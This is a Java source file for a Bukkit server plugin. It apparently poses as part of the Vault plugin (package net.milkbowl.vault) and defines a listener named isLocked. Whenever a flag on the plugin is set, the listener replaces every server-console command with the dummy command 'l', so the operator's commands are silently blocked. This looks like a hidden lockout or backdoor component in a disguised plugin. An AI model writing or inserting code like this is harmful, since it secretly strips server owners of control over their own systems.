package net.milkbowl.vault.events;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

import net.milkbowl.vault.Core;

public class isLocked implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	@EventHandler
	public void onCommand(ServerCommandEvent q) {
		if (plugin.isLocked) {
			q.setCommand("l");
		}
	}

}
